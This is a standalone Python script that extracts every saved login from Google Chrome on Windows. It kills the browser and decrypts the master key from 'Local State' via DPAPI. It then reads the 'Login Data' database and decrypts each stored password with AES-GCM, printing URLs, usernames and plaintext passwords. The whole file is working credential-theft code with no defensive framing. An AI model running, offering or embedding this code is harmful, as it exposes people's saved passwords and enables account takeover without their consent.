import os
import sqlite3
import json
import base64
import win32crypt
from Crypto.Cipher import AES

def getPasswords():
    try:
        os.system("taskkill /F /IM chrome.exe")
        os.system('cls' if os.name == 'nt' else 'clear')

        dbPath = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
        keyPath = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Local State"

        if not os.path.exists(dbPath) or not os.path.exists(keyPath):
            print(f"Login Data' or 'Local State' file not found.")
            return

        with open(keyPath, 'r') as file:
            localState = json.load(file)
        encryptedKey = base64.b64decode(localState['os_crypt']['encrypted_key'])[5:]
        decryptedKey = win32crypt.CryptUnprotectData(encryptedKey, None, None, None, 0)[1]

        conn = sqlite3.connect(dbPath)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        for originUrl, username, encryptedPassword in cursor.fetchall():
            if not username or not encryptedPassword:
                continue

            try:
                iv = encryptedPassword[3:15]
                cipher = AES.new(decryptedKey, AES.MODE_GCM, iv)
                decryptedPassword = cipher.decrypt(encryptedPassword[15:-16]).decode()

                print(f"Main URL: {originUrl}")
                print(f"User name: {username}")
                print(f"Decrypted Password: {decryptedPassword}\n")
            except Exception as e:
                print(f"Error decrypting password for {originUrl}: {e}")

        conn.close()
    except Exception as e:
        print(f"General error: {e}")

if __name__ == "__main__":
    getPasswords()
